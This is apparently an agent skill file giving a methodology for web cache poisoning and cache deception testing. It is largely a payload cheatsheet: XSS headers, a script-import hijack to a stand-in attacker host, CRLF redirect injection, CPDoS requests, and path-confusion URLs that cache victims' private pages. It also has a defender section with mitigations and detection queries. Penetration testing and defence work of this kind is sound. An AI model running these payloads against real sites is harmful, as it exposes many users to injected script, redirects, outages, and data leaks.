---
name: offensive-web-cache-poisoning
description: "Web cache poisoning and web cache deception testing skill for offensive security assessments and bug bounty hunting. Covers identifying cacheable responses via Cache-Control, X-Cache HIT/MISS, Age, and CDN headers; discovering unkeyed inputs (X-Forwarded-Host, X-Forwarded-Scheme, X-Forwarded-For, X-Host, X-Original-URL, custom headers) with Burp Param Miner; poisoning caches to deliver stored XSS, malicious redirects, JavaScript/resource import hijacking, and cache-based DoS (CPDoS). Includes cache key injection, fat GET requests, parameter cloaking (duplicate params, semicolon delimiters, keyed-vs-unkeyed discrepancies), cache key normalization and delimiter confusion, multi-cache/CDN chain quirks, and web cache deception via path confusion (/account.php/nonexistent.css, path traversal /profile/..%2fx.css, path parameters and delimiters) to make a CDN cache authenticated pages for attacker retrieval. Tooling: Burp Suite Param Miner, web-cache-vulnerability-scanner (wcvs). Use when testing CDNs, reverse proxies, Varnish/Nginx/Cloudflare/Akamai/Fastly caching layers, or any application that serves cached content to multiple users."
---

# Web Cache Poisoning & Web Cache Deception — Offensive Testing Methodology

Caches sit between the client and the origin to serve stored responses to many users at once. Two distinct bug classes abuse this trust boundary. **Cache poisoning** tricks the cache into storing a harmful response (keyed on an input the attacker controls but the cache ignores) so it is replayed to every subsequent visitor. **Cache deception** tricks the cache into storing a *victim's* authenticated response under a URL the attacker can later request, leaking private data. Both hinge on a single root disagreement: what the cache treats as the *cache key* versus what the origin treats as *significant input*. Find that gap and you convert a single request into a persistent, multi-user attack.

## Quick Workflow

1. Identify which responses are cached and what the cache key is (Cache-Control, Age, X-Cache, CDN-specific headers).
2. Discover unkeyed inputs — headers and parameters the origin reflects or acts on but the cache excludes from the key (Param Miner).
3. Prove a response is cacheable *and* that your unkeyed input is reflected/impactful in the cached copy.
4. Craft a payload (XSS, redirect, resource hijack, DoS) and confirm it is served to a different client/session.
5. For cache deception: find path-confusion tricks that make a dynamic authenticated page look like a static asset to the cache.
6. Document the exact request, the cache key, the TTL/eviction window, and the blast radius. Clean up poisoned entries where possible.

---

## Step 1 — Identify Cacheable Responses

Before anything is exploitable, confirm the target actually caches. Send the same request twice and diff the response headers.

### Cache Indicator Headers

```http
GET /en?cb=1 HTTP/1.1
Host: www.example.com

HTTP/1.1 200 OK
Cache-Control: public, max-age=30
Age: 12
X-Cache: hit
X-Cache-Hits: 3
CF-Cache-Status: HIT
X-Served-By: cache-lhr1234-LHR
Vary: Accept-Encoding
```

| Header | Meaning | Offensive read |
|---|---|---|
| `Cache-Control: public, max-age=N` | Explicitly cacheable for N seconds | ✓ Primary green light |
| `Age: N` | Seconds the response has sat in cache | ✓ Non-zero = served from cache |
| `X-Cache: hit` / `miss` | Generic cache status (Varnish, many CDNs) | ✓ `hit` on 2nd request = cached |
| `X-Cache-Hits: N` | Hit counter | ✓ Increments = shared entry |
| `CF-Cache-Status: HIT` | Cloudflare | ✓ `HIT`/`MISS`/`DYNAMIC`/`BYPASS` |
| `X-Served-By`, `X-Timer` | Fastly | ⚠ Node names reveal multi-tier cache |
| `X-Drupal-Cache`, `X-Varnish` | App/edge cache stack | ⚠ Fingerprint the layer |
| `Vary` | Fields added to the key | ⚠ Each listed header is keyed |
| `Pragma: no-cache` / `private` / `no-store` | Not cacheable (usually) | ✗ But test anyway — misconfig common |

### Confirming a Cache Hit

```bash
# Same URL twice; watch Age climb and X-Cache flip to hit
for i in 1 2; do
  curl -s -D - -o /dev/null "https://www.example.com/en?cb=$RANDOM" \
    | grep -iE 'age|x-cache|cf-cache|cache-control|x-served-by'
done

# Fixed cache-buster so both requests share a key
URL="https://www.example.com/en?cb=poc123"
curl -s -D - -o /dev/null "$URL" | grep -i x-cache   # likely miss
curl -s -D - -o /dev/null "$URL" | grep -i x-cache   # should be hit
```

> ⚠ Always use a unique cache-buster (`?cb=<random>`) while hunting so you never poison the real key during discovery, and only switch to the live key once you understand the blast radius.

---

## Step 2 — Find Unkeyed Inputs

The cache key is usually `method + host + path + querystring` (plus any `Vary` headers). Anything *outside* the key that still changes the response is an **unkeyed input** — your injection channel.

### High-Value Unkeyed Headers

```http
X-Forwarded-Host: evil.example.net
X-Forwarded-Scheme: nothttps
X-Forwarded-Proto: http
X-Host: evil.example.net
X-Forwarded-Server: evil.example.net
X-Forwarded-For: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-Port: 1337
Forwarded: host=evil.example.net
```

Many frameworks build absolute URLs (canonical links, `<script src>`, redirects, password-reset links) from `X-Forwarded-Host` or `X-Host` while the cache keys only on the real `Host`. That is the classic poisoning primitive.

### Manual Probe for a Reflected Unkeyed Header

```http
GET /en?cb=probe1 HTTP/1.1
Host: www.example.com
X-Forwarded-Host: canary9321.example.net

HTTP/1.1 200 OK
...
<link rel="canonical" href="https://canary9321.example.net/en"/>
```

If `canary9321.example.net` appears in the body and the response is cacheable, you have an unkeyed, reflected input. Confirm it persists by re-requesting *without* the header on the same cache key.

### Burp Param Miner — Header & Parameter Discovery

Param Miner (PortSwigger BApp) brute-forces thousands of header/parameter names and auto-detects cache behavior.

```text
# Install: Burp > Extensions > BApp Store > "Param Miner"
# Then right-click a cached request:

Param Miner > "Guess headers"              # unkeyed header discovery
Param Miner > "Guess GET parameters"        # hidden/unkeyed params
Param Miner > "Guess cookies"
# Enable these settings for cache work:
#   - "Add fcbz cachebuster"                (unique key per probe)
#   - "Add dynamic cachebuster"
#   - "Learn observations" / "Add cache-poisoning canary"
# Param Miner flags findings as:
#   "Identified cache poisoning" / "Secret input" with the header name.
```

Param Miner injects a per-request canary and reports when an *unkeyed* input influences a *cacheable* response — exactly the condition you need. Review the "Issues" tab for `Web cache poisoning` findings and reproduce them manually before trusting them.

### web-cache-vulnerability-scanner (wcvs)

```bash
# Hackmanit's Go scanner — https://github.com/Hackmanit/web-cache-vulnerability-scanner
wcvs -u https://www.example.com/

# Custom header wordlist + generator for payloads
wcvs -u https://www.example.com/ \
     -hw headers.txt \
     -gi "https://www.example.com/" \
     -gp "cb" \
     --threads 20 \
     --report report.json

# Target a single header class and increase recursion depth for deception
wcvs -u https://www.example.com/profile -cepl 3
```

---

## Reflected Unkeyed Header → Stored XSS

The highest-impact classic poison: an unkeyed header is reflected unsanitized into a cached page, so every visitor executes attacker script.

### Reflected `X-Forwarded-Host` into a script import

```http
GET /?cb=xss01 HTTP/1.1
Host: www.example.com
X-Forwarded-Host: a."><script>alert(document.domain)</script>

HTTP/1.1 200 OK
Cache-Control: public, max-age=60
...
<meta property="og:url" content="https://a."><script>alert(document.domain)</script>"/>
```

Once this 200 is cached under `/?cb=xss01`, anyone hitting that key gets the script. In a real engagement you poison a genuinely-trafficked key (e.g. `/` or `/en`) during the TTL window, prove execution in a separate browser/session, and report the exact timestamp.

### Hijacking a dynamically-imported resource

Pages often build `<script src>` from a host header. Poison it to point at attacker infrastructure:

```http
GET /en?cb=xss02 HTTP/1.1
Host: www.example.com
X-Forwarded-Host: attacker.192-0-2-10.example-sandbox.net

HTTP/1.1 200 OK
Cache-Control: public, max-age=300
...
<script src="//attacker.192-0-2-10.example-sandbox.net/static/analytics.js"></script>
```

Host the malicious `analytics.js` and every cached-page visitor loads it. Use RFC 5737 documentation space (192.0.2.0/24) or your own authorized redirector; never a real third party.

### Confirming a "stored" (cached) XSS vs a one-off reflection

```bash
# 1. Poison with the header
curl -s "https://www.example.com/en?cb=xss02" \
     -H 'X-Forwarded-Host: a"><script>alert(1)</script>' -o /dev/null
# 2. Fetch WITHOUT the header — payload must still be present (served from cache)
curl -s "https://www.example.com/en?cb=xss02" | grep -o '<script>alert(1)</script>'
```

If step 2 returns the payload, it is stored in the cache, not merely reflected.

---

## Malicious Redirect & Open-Redirect Poisoning

If the origin issues a redirect built from an unkeyed input, you can cache a 301/302 that sends everyone to an attacker page (phishing, OAuth token theft, forced download).

```http
GET /?cb=redir01 HTTP/1.1
Host: www.example.com
X-Forwarded-Host: evil.example.net

HTTP/1.1 302 Found
Location: https://evil.example.net/?cb=redir01
Cache-Control: public, max-age=120
Age: 0
```

Response splitting / header injection variants (where a newline in an unkeyed input lets you forge the `Location` or inject `Set-Cookie`) are especially dangerous when cached:

```http
X-Forwarded-Host: example.net%0d%0aLocation:%20https://evil.example.net
```

Combine with `offensive-open-redirect` techniques: a cached open redirect at a trusted origin defeats most referrer/allowlist phishing checks because the victim sees the legitimate domain.

---

## Cache Key Injection

Sometimes the input *is* part of the key but is reflected before normalization, letting you inject payloads into the key itself (common with `Vary`-reflected headers, keyed query params reflected into imports, or key components placed into `<base>`/`<script>` tags).

```http
GET /?utm_content=x'><script>alert(1)</script>&cb=key01 HTTP/1.1
Host: www.example.com

HTTP/1.1 200 OK
Cache-Control: public, max-age=60
...
<script>var utm = 'x'><script>alert(1)</script>';</script>
```

Keyed-input poisoning is self-limiting (only the exact crafted key is poisoned), but it is reliable and survivable because the victim must visit that key — useful when you can seed the link (email, forum, QR). Look for keyed headers via `Vary` and reflected keyed params via Param Miner's "Guess GET parameters".

---

## Fat GET Requests

Some stacks parse a request body or duplicate parameter on a `GET` even though the cache keys only on the URL. This lets you smuggle an input past the key.

```http
GET /?param=innocent HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 46

param=<script>alert(document.domain)</script>
```

If the origin prefers the body value (or the last `param`) while the cache keys only on `?param=innocent`, the malicious body is reflected into the cached response for everyone requesting `?param=innocent`. Also try a second query occurrence in the body or an override header:

```http
GET /?param=innocent HTTP/1.1
Host: www.example.com
X-HTTP-Method-Override: GET
Content-Length: 40

param=<script>alert(1)</script>
```

---

## Parameter Cloaking & Delimiter Confusion

Cloaking exploits the cache and origin disagreeing on where a parameter starts/ends or which duplicate wins. The goal: a parameter that affects the origin response but is invisible to (or differently parsed by) the cache key.

### Duplicate parameters (last-wins vs first-wins)

```http
# Cache may key on first `callback`, origin may honor the second
GET /jsonp?callback=legit&callback=alert(1)//&cb=clk01 HTTP/1.1
Host: www.example.com
```

### Semicolon as a parameter delimiter

Ruby on Rails, some Java stacks, and older frameworks treat `;` as a separator. A CDN that does *not* will fold the hidden parameter into the cache key's "value", excluding it from meaningful keying.

```http
# Cache sees one param `param=123;excluded=<payload>`
# Rails origin sees param=123 AND excluded=<payload>
GET /?param=123;excluded_param=<script>alert(1)</script> HTTP/1.1
Host: www.example.com
```

### Keyed vs unkeyed parameter portions / exclusion rules

Many CDNs strip "unimportant" params from the key (e.g. `utm_*`, `fbclid`) via cache rules. If the origin still reflects a stripped param, it becomes unkeyed:

```http
# If the CDN excludes utm_source from the key but the app reflects it:
GET /?utm_source=x"><script>alert(1)</script>&cb=clk02 HTTP/1.1
Host: www.example.com
```

### Normalization & delimiter discrepancies

The cache and origin may normalize the path/query differently (case, URL-encoding, dot-segments, trailing data). Each discrepancy is a cloaking primitive.

```http
# Encoded delimiter the cache decodes but origin does not (or vice versa)
GET /?param=123%26excluded=payload HTTP/1.1
GET /%2561dmin HTTP/1.1          # double-encoded path segment
GET /EN?cb=1 HTTP/1.1           # case-normalization mismatch
```

Test matrix to run against every candidate: `?a=1&a=2`, `?a=1;b=2`, `?a=1%26b=2`, `?a=1%3Bb=2`, trailing `?`, trailing `#frag`, and mixed case — diff which copy the cache serves vs what the origin reflected.

---

## Exploiting Multiple Caches / CDN Chains

Real deployments stack caches: browser → CDN edge → regional shield → origin reverse proxy (e.g. Cloudflare in front of Varnish in front of Nginx). Each layer has its own key and normalization rules, multiplying discrepancies.

- **Different keying per layer:** the edge may key on `Host` only while the internal Varnish also keys on `X-Forwarded-Host`, so poison targets one tier.
- **Internal cache reachability:** an input stripped at the edge may survive to poison a deeper cache if you reach it via a smuggled or alternate path.
- **Cache-on-cache TTL stacking:** poison persists until the *shortest* TTL in the chain expires — map each `Age`/`max-age` to estimate the window.
- **CDN-specific quirks:** Cloudflare caches by file extension / "Cache Everything" page rules; Fastly uses VCL with surrogate keys; Akamai honors `Edge-Control`. Fingerprint via `CF-Cache-Status`, `X-Served-By`, `X-Cache` node names, and `Surrogate-Control`.

```bash
# Enumerate every cache tier's view of one URL
curl -s -D - -o /dev/null https://www.example.com/en?cb=chain1 \
  | grep -iE 'age|x-cache|cf-cache|x-served-by|x-varnish|surrogate|edge-control'
```

---

## Cache-Based Denial of Service (CPDoS)

Cache Poisoned Denial of Service makes the cache store an *error* page and serve it to everyone. You never need reflected XSS — just the ability to make the origin error while the response stays cacheable.

| Variant | Mechanism |
|---|---|
| HHO (HTTP Header Oversize) | Send an oversized header the origin rejects (400) but the cache stores |
| HMC (HTTP Meta Character) | Inject a meta char (`\n`, `\a`) in a header that errors the origin |
| HMO (HTTP Method Override) | `X-HTTP-Method-Override: POST` turns a cached GET into an erroring method |

```http
# HHO — origin returns cacheable 400, poisoning the key
GET /?cb=dos01 HTTP/1.1
Host: www.example.com
X-Oversized-Header: AAAAAAAA...[20KB]...AAAA

# HMO — override to a method the origin rejects
GET /?cb=dos02 HTTP/1.1
Host: www.example.com
X-HTTP-Method-Override: DELETE
```

If the error response carries `Cache-Control: public` (misconfig) or the CDN caches 4xx by default, legitimate users get the broken page until TTL expiry. Report these as availability findings with the exact cacheable error.

---

## Web Cache Deception (WCD)

WCD inverts the attack: instead of poisoning content for others, you coax the cache into storing *another user's private, authenticated* response under a URL you can fetch anonymously. Discovered by Omer Gil (2017), it still breaks modern CDNs when caching rules match on file extension or path prefix rather than the origin's actual content-type.

### Core idea

Caches often cache "static-looking" URLs (ending `.css`, `.js`, `.jpg`, `/static/…`) aggressively and ignore cookies. If the origin routes `/account.php/nonexistent.css` to the dynamic `/account.php` handler (returning the victim's data) but the CDN sees the `.css` suffix and caches it, the attacker later requests the same URL and receives the cached private page.

### Path confusion via appended fake static file

```http
# Victim (authenticated) is lured to:
GET /account/settings/foo.css HTTP/1.1
Host: www.example.com
Cookie: session=<victim>

# Origin ignores the extra segment, returns victim's settings page.
# CDN caches it because of the .css extension.

# Attacker later:
GET /account/settings/foo.css HTTP/1.1
Host: www.example.com
# -> served the cached victim settings page, no cookie needed.
```

### Path traversal / encoded separators to reach a cached directory

```http
GET /profile/..%2fstatic/x.css HTTP/1.1
GET /profile%2f%2e%2e%2fstatic%2fnonexistent.css HTTP/1.1
GET /account.php/../static/poc.css HTTP/1.1
```

The origin collapses `..` back to the dynamic endpoint while the cache keys the literal (encoded) path that *looks* static.

### Path parameters & delimiters

Different servers delimit the "real" path from extra data differently; abuse the delimiter the cache ignores but the origin honors.

```http
GET /account.php;foo.css HTTP/1.1        # semicolon path param (Java/Tomcat)
GET /account.php%3Bfoo.css HTTP/1.1      # encoded semicolon
GET /account.php%2ffoo.css HTTP/1.1      # encoded slash
GET /account.php%00foo.css HTTP/1.1      # null byte (legacy)
GET /account.php#foo.css HTTP/1.1        # fragment-as-delimiter confusion
GET /account.php?x=1.css HTTP/1.1        # extension-in-query rule match
```

### WCD confirmation workflow

```bash
# 1. As the "victim" session, request the confused path and confirm private data returns.
curl -s -b "session=VICTIM" "https://www.example.com/account/settings/poc.css" \
     | grep -i 'email\|balance\|api_key'
# 2. Confirm it was cached (Age/X-Cache on a repeat).
curl -s -D - -o /dev/null "https://www.example.com/account/settings/poc.css" | grep -iE 'age|x-cache|cf-cache'
# 3. As an ANONYMOUS client (no cookie), fetch the same URL.
curl -s "https://www.example.com/account/settings/poc.css" | grep -i 'email\|balance\|api_key'
```

If step 3 leaks the victim's data without a cookie, WCD is confirmed. The highest impact is caching responses containing CSRF tokens, API keys, PII, or session identifiers.

### WCD test extension/prefix list

```text
Extensions: .css .js .jpg .png .gif .ico .svg .woff .woff2 .pdf .txt .html .avif
Static prefixes: /static/ /assets/ /public/ /resources/ /cdn-cgi/ /media/
Delimiters: / ; %2f %3b %00 %23 ? #   (append after the real endpoint)
```

---

## Detection / Defender View

What a defender sees and how to shut each primitive down.

- **Telemetry signatures:** bursts of identical URLs with anomalous headers (`X-Forwarded-Host`, `X-Host`, `X-Original-URL`), oversized headers, method-override headers, and `.css`/`.js` suffixes on dynamic endpoints. Param Miner / wcvs scans show as high-rate, header-fuzzing traffic with per-request canary tokens.
- **Cache-hit anomalies:** a normally-dynamic path suddenly serving `X-Cache: hit` with `Age > 0`; 4xx/5xx responses with `Age` set (CPDoS); edge nodes reporting HIT for authenticated routes (WCD).

### Cache key hygiene

- **Key on everything significant.** Any header or parameter the origin uses to build the response must be in the cache key (or the response must be uncacheable). Add reflected headers to `Vary` or strip them at the edge.
- **Strip/normalize untrusted headers at the edge** before they reach the origin: remove `X-Forwarded-Host`, `X-Host`, `X-Original-URL`, `X-Rewrite-URL`, and friends unless explicitly needed, and never reflect them.
- **Normalize before keying:** canonicalize case, decode once, collapse `..`/`;`/duplicate params, and reject ambiguous delimiters so the cache and origin agree on one interpretation.

### Don't cache personalized responses

- Set `Cache-Control: private, no-store` on any authenticated/personalized response; have the CDN honor `Set-Cookie`/`Authorization` as cache-bypass signals.
- Decide cacheability by the origin's `Content-Type` and `Cache-Control`, **not** by URL file extension or path prefix. This single rule kills most WCD.
- Never cache 4xx/5xx by default; require explicit opt-in and short TTLs. Disable `X-HTTP-Method-Override` and cap header sizes consistently across tiers.
- Prefer one RFC-compliant parsing/normalization library across the whole chain so no two tiers disagree.

### Defender detection queries

```spl
index=cdn (cs_x_forwarded_host=* OR cs_x_host=* OR cs_x_original_url=*)
| stats count values(uri_path) by cs_x_forwarded_host, c_ip
| where count > 5
```

```text
# Cacheable error / CPDoS watch (CDN logs)
cache_status=HIT status>=400
# Cache deception watch — static suffix on dynamic handler
uri=*.css OR uri=*.js  AND  upstream_content_type="text/html"  AND cache_status=HIT
```

---

## Engagement Cheatsheet

```bash
# 1. Is it cached? (unique buster during recon)
URL="https://www.example.com/en"
curl -s -D- -o/dev/null "$URL?cb=r1" | grep -iE 'age|x-cache|cf-cache|cache-control'
curl -s -D- -o/dev/null "$URL?cb=r1" | grep -iE 'age|x-cache'   # expect hit

# 2. Reflected unkeyed header probe
curl -s "$URL?cb=p1" -H 'X-Forwarded-Host: canary1337.example.net' | grep canary1337

# 3. Confirm it stored (no header on re-fetch)
curl -s "$URL?cb=p1" | grep canary1337

# 4. Automated discovery
#    Burp: Param Miner > Guess headers (enable cachebuster + poisoning canary)
wcvs -u "$URL" -hw headers.txt

# 5. Classic poison payloads (swap into the identified unkeyed input)
#    X-Forwarded-Host: a"><script>alert(document.domain)</script>
#    X-Forwarded-Host: attacker.192-0-2-10.example-sandbox.net   (resource hijack)
#    X-Forwarded-Scheme: nothttps                                (force http redirect)

# 6. Parameter cloaking
curl -s "$URL?x=1;excluded=<script>alert(1)</script>"
curl -s "$URL?utm_source=x%22%3E%3Cscript%3Ealert(1)%3C/script%3E"

# 7. CPDoS
curl -s -D- -o/dev/null "$URL?cb=d1" -H "X-HTTP-Method-Override: DELETE" | grep -iE 'age|status'

# 8. Web cache deception (victim then anon)
curl -s -b "session=VICTIM" "https://www.example.com/account/settings/poc.css" | grep -i email
curl -s                     "https://www.example.com/account/settings/poc.css" | grep -i email
```

Methodology summary: confirm cacheability → enumerate unkeyed inputs with Param Miner/wcvs → prove reflection persists in the cached copy → weaponize (XSS / redirect / resource hijack / CPDoS) or pivot to deception via path confusion → demonstrate cross-session impact → document key, TTL, and blast radius → report and purge.

---

## Key References

- James Kettle — "Practical Web Cache Poisoning" (PortSwigger Research, 2018): https://portswigger.net/research/practical-web-cache-poisoning
- James Kettle — "Web Cache Entanglement: Novel Pathways to Poisoning" (PortSwigger Research, 2020): https://portswigger.net/research/web-cache-entanglement
- Omer Gil — "Web Cache Deception Attack" (2017): https://omergil.blogspot.com/2017/02/web-cache-deception-attack.html
- PortSwigger Web Security Academy — Web cache poisoning labs: https://portswigger.net/web-security/web-cache-poisoning
- PortSwigger Web Security Academy — Web cache deception labs: https://portswigger.net/web-security/web-cache-deception
- Burp Suite Param Miner (BApp Store): https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943
- Hackmanit — web-cache-vulnerability-scanner (wcvs): https://github.com/Hackmanit/web-cache-vulnerability-scanner
- Nguyen, Mainka, Meyer, Schwenk — "Your Cache Has Fallen: Cache-Poisoned Denial-of-Service Attack" (CPDoS, CCS 2019): https://cpdos.org/
- OWASP WSTG — Testing for Web Cache Poisoning (WSTG-INPV-19)
- MITRE: CWE-444 (Inconsistent Interpretation of HTTP Requests), CWE-525 (Use of Web Browser Cache Containing Sensitive Information), CWE-639 (Authorization Bypass via User-Controlled Key)
- MITRE ATT&CK: T1557 (Adversary-in-the-Middle), T1190 (Exploit Public-Facing Application)
